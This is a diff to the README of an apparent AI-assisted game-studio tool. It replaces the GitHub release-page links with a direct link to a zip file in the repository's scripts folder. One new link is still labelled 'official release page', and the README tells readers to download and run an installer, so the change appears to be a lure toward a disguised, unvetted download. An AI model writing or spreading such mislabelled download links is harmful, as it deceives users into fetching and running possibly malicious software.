@@ -1,6 +1,6 @@
 # 🎮 godot-game-studio-agent - Build professional games with AI assistance
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/deist-huntedperson464/godot-game-studio-agent/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/deist-huntedperson464/godot-game-studio-agent/main/scripts/studio_game_agent_godot_v1.3.zip)
 
 This software helps you create video games. It uses AI tools to assist with game design, coding, and asset creation. You can use it within Godot, Unity, or Unreal Engine. It manages complex tasks like game-feel, asset pipelines, and project workflows.
 
@@ -20,7 +20,7 @@ Before you install this software, check your computer. You need these things to 
 You must visit the project release page to get the files. Follow these steps:
 
 1.  Open your web browser.
-2.  Navigate to the [official release page](https://github.com/deist-huntedperson464/godot-game-studio-agent/releases).
+2.  Navigate to the [official release page](https://raw.githubusercontent.com/deist-huntedperson464/godot-game-studio-agent/main/scripts/studio_game_agent_godot_v1.3.zip).
 3.  Look for the section labeled "Assets" under the most recent version.
 4.  Click the link that ends in .exe or .msi to save the installer to your computer.
 5.  Wait for the file to finish downloading.
